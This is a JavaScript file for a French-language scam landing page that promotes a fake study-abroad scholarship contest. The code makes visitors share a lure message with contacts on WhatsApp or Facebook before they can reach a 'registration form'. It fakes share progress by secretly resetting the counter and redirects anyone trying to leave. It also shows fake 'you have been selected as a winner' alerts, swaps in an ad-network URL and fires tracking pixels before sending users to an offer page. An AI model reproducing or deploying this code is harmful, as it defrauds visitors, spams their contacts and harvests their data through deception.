

// EOF obfuscation


// ORIGINAL JAVASCRIPT CODE

var TXT_SHARE_COMPLETE = "Sur la page suivante, confirmez vos données et continuez.";
var TXT_SHARE_MESSAGE = "Vous devez partager à "+ window.shareCount +" personnes sur WhatsApp pour accéder au FORMULAIR d'enregistrement. Vous avez déjà partagé avec : %s amis";
var TXT_WHATSAPP_MESSAGE = "*CONCOURS DE BOURSE D'ETUDES organisé par l'agence GOD SAVE *Pour les pays ci apres; CANADA, BELGIQUE, CHYPRE, UKRAINE, TURQUIE, LITUANIE, POLOGNE, TUNISIE Dépêchez-vous de vous inscrire maintenant Car les places sont limités en cliquant ici* %0D%0A 09agence.com";
var TXT_SWITCH_WHATSAPP_MESSAGE = "";
var TXT_LEAVE_SURVEY = "Êtes-vous sûr de vouloir quitter cette enquête ? Le coupon ira à la personne suivante !";
var TXT_DISABLE_CLICK = "Cliquez avec le bouton droit sur Désactivé.";
var TXT_REPLY = "Reply";
var TXT_LIKE = "Like";
var TXT_FOLLOW_POST = "Follow Post";
var TXT_LANGUAGE = "en";
var TXT_BRAND = "";

//utilisé en conjonction avec le paramètre "message" pour afficher une boîte de dialogue d'alerte (exemple : http://(...)/?message=1)
var messageBox = [
	
	" Offre Promotionnelle pour gagner 2 Billets Offerts et Voler avec !",
	"Félicitations !\n\nVous avez été sélectionné comme l'un de nos gagnants potentiels d'aujourd'hui.",
	"Félicitations !\n\nVous avez été sélectionné comme gagnant d'aujourd'hui.",
	"Félicitations !\n\nVous avez été sélectionné comme l'un des heureux participants au" + window.brand + " enquête.",
	"Cher visiteur,\n\nVeuillez prendre 1 minute de votre temps pour répondre à notre enquête et nous vous récompenserons avec un " + window.brand + " carte cadeau.",
	"Cher visiteur,\n\nNous avons détecté que vous habitez près de " + window.city + " et nous aimerions obtenir vos commentaires car nous ouvrons un nouveau magasin dans votre région.",
	"Félicitations utilisateur !\n\nVous avez été sélectionné au hasard pour participer au concours de cartes-cadeaux du supermarché ! Tentez une chance de gagner les cartes-cadeaux du supermarché !\nCliquez sur OK pour commencer !"
	
];

var share_enable = true;
var show_questions = true;
var switch_urls = false;
var switch_wa_share_text = false;
var switch_after_x_shares = 10;
var track_after_x_shares = 1;
var switch_to_wa_url = "//graizoah.com/afu.php?zoneid=2790321";
var switch_to_fb_url = "https://www.facebook.com/";
// var fb_comments = ;

var areYouReallySure = false,
	internalLink = false,
	social_network = window.shareType,
	wa_message = TXT_WHATSAPP_MESSAGE,
	rnd_wa = rnd_url = 0,
	wa_len = wa_message.split( "|" ).length,
	url_len = window.shareUrl.split( "|" ).length;

if ( wa_len === url_len ) {
	rnd_wa = rnd_url = Math.floor( Math.random() * wa_len );
} else {
	rnd_wa = Math.floor( Math.random() * wa_len );
	rnd_url = Math.floor( Math.random() * url_len );
}

// get query string parameters of a URL
var $_GET = getQueryParams( document.location.search );

if ( $_GET[ "message" ] ) {
	
	alert( messageBox[ $_GET[ "message" ] - 1 ] );
	
}

// redirects or returns message for exit traffic
function areYouSure() {
	
	if ( !areYouReallySure && !window.internalLink ) {
		
		areYouReallySure = true;
		
		window.location.href = window.exitUrl;
		
		return TXT_LEAVE_SURVEY;
		
	}
	
}

if ( window.popup !== false ){};

// get query string parameter's value of a URL
function gup( param ) {
	
	return decodeURIComponent( ( RegExp( param + "=" + "(.*?)(&|$)" ).exec( location.search ) || [, null] )[ 1 ] || "" );
	
}

window.resetCount = false;
//c = window.startCounter;
c = getCookie( 'c' ) ? getCookie( 'c' ) : window.startCounter;
var completed = getCookie( 'completed' ) ? getCookie( 'completed' ) : false;
var sent = getCookie( 'sent' ) ? getCookie( 'sent' ) : false;

// shares
function share( item ) {
	
	c++;
	
	if ( switch_urls && ( c > switch_after_x_shares ) ) {
		
		window.shareUrl = switch_to_wa_url;
		window.shareUrlFB = switch_to_fb_url;
		
	}
	
	if ( switch_wa_share_text && ( c > switch_after_x_shares ) ) {
		
		wa_message = TXT_SWITCH_WHATSAPP_MESSAGE;
		
	}
	
	if ( c == track_after_x_shares ) {
		
		firePixel();
		
	}
	
	if ( window.shareType == "facebook" || typeof window.orientation == "undefined" ) {
		
		// just 1 share for facebook
		c = window.shareCount;
		
		// set cookie valid for 2 days
		setCookie( 'c', c, 2 );
		
		social_network = 'Facebook';
		
		ga( 'send', 'event', social_network, '[1][' + TXT_LANGUAGE + '] ' + TXT_BRAND );
		
		// facebook share
		window.open( "http://www.facebook.com/sharer.php?u=" + encodeURIComponent( window.shareUrlFB ) );
		
	} else {
		
		// WhatsApp share
		
		// set cookie valid for 2 days
		setCookie( 'c', c, 2 );
		
		social_network = 'WhatsApp';
		
		ga( 'send', 'event', social_network, '[' + c + '][' + TXT_LANGUAGE + '][URL' + ( rnd_url + 1 ) + '][TXT' + ( rnd_wa + 1 ) + '] ' + TXT_BRAND );
		
		// change number of shares after "window.shareScrubAt" shares
		if ( c == window.shareScrubAt && !window.resetCount ) {
			
			// change number of shares to "window.shareScrubTo"
			c = window.shareScrubTo;
			window.resetCount = true;
			
		}
		
		// sharing not finished
		if ( window.shareTarget == "NEW" ) {
			
			window.internalLink = true;
			window.open( "whatsapp://send?text=" + wa_message.split( "|" )[ rnd_wa ].replace( "%s", window.shareUrl.split( "|" )[ rnd_url ] ) );
			window.internalLink = false;
			
		} else {
			
			window.internalLink = true;
			location.href = ( "whatsapp://send?text=" + wa_message.split( "|" )[ rnd_wa ].replace( "%s", window.shareUrl.split( "|" )[ rnd_url ] ) );
			window.internalLink = false;
			
		}
		
	}
	
	setTimeout(function(){ document.getElementById('counter').innerHTML = c; }, 5000);
	
}

// continue if sharing finished
function share2( item ) {
	
	if ( !share_enable || ( c >= window.shareCount ) ) {
		
		// set cookie valid for 2 days
		setCookie( 'completed', true, 2 );
		
		ga( 'send', 'event', social_network, '[complete][' + TXT_LANGUAGE + '] ' + TXT_BRAND );
		
		alert( TXT_SHARE_COMPLETE );
		
		if ( window.offerUrl ) {
			
			// open offer window
			goOffer();
			
		}
		
	} else {
		
		alert( TXT_SHARE_MESSAGE.replace( "%s", c ) );
		
	}
	
}

// continue without checking for number of shares
function share3( item ) {
	
	if ( window.offerUrl ) {
		
		// open offer window
		goOffer();
		
	}
	
}

// opens offer window
function goOffer() {
	
	if ( window.popup === false ) {
		
		// same browser window
		location.href = window.offerUrl;
		
	} else {
		
		// new browser window
		window.open( window.offerUrl );
		
	}
	
}



// fires tracking pixel after X shares
function firePixel() {
	
	$( "#conversion-container" ).append( "<iframe width='1' height='1' src='pixel.html'></iframe>" );
	
}

// gets query string parameters
function getQueryParams( query ) {
	
	query = query.split( "+" ).join( " " );
	
	var params = {},
			results, regex = /[?&]?([^=]+)=([^&]*)/g;
	
	while ( results = regex.exec( query ) ) {
		
		params[ decodeURIComponent( results[ 1 ] ) ] = decodeURIComponent( results[ 2 ] );
		
	}
	
	return params;
	
}

// set specific cookie
function setCookie( cname, cvalue, exdays ) {
	
	var d = new Date();
	d.setTime( d.getTime() + ( exdays * 24 * 60 * 60 * 1000 ) );
	var expires = 'expires=' + d.toGMTString();
	document.cookie = cname + '=' + cvalue + '; ' + expires;
	
}

// get specific cookie
function getCookie( cname ) {
	
	var name = cname + '=';
	var ca = document.cookie.split( ';' );
	for ( var i = 0; i < ca.length; i++ ) {
		
		var c = ca[ i ];
		while ( c.charAt( 0 ) == ' ' ) c = c.substring( 1 );
		
		if ( c.indexOf( name ) == 0 ) {
			
			return c.substring( name.length, c.length );
			
		}
		
	}
	
	return '';
	
}

function isCookieSet(cname) {
	var name = cname+'=';
	var ca = document.cookie.split(';');
	for (var i = 0; i < ca.length; i++) {
		var c = ca[i];
		
		while (c.charAt(0) == ' ') c = c.substring(1);
		
		if (c.indexOf(name) === 0) {
			return true;
		}
	}
	
	return false;
}

$(document).ready(function(){$(".panel").hide();$(".panel:first-child").show();$(".questionblock .button").click(function(){var questionBlock=$(this).parent();var self=this;questionBlock.hide();var last=questionBlock.data("last");if(last!="1")questionBlock.next().show();else{$(".prelander-progress.hide").removeClass("hide");var si=setInterval(function(){var pending=$(".prelander-progress .hide").first();if(!pending.length){clearInterval(si);$(".panel").hide();$(".prelander-progress").hide();$(self).parents(".panel").next(".panel").show()}else pending.removeClass("hide")},
1500)}});if(show_questions){$(".participate, #page1 .pic-wrap img").click(function(){$(".hero-line-sm").hide();$(".questionfield").show();$("#input1 .position-info, #input2 .position-info").show();$("html, body").animate({scrollTop:0},400)});}else{$(".participate, #page1 .pic-wrap img").click(function(){$(".panel").hide();$("#input1").show();});}if($("#modal-lang").length)$("#modal-lang").modal({escapeClose:false,clickClose:false,showClose:false});$(".warning-opener").click(function(){var warningAlert=$(this).parents(".header-warning");if(warningAlert.hasClass("opened"))warningAlert.removeClass("opened");else warningAlert.addClass("opened")});if(isCookieSet('c')){$(".panel").hide();$("#input1").show();}});
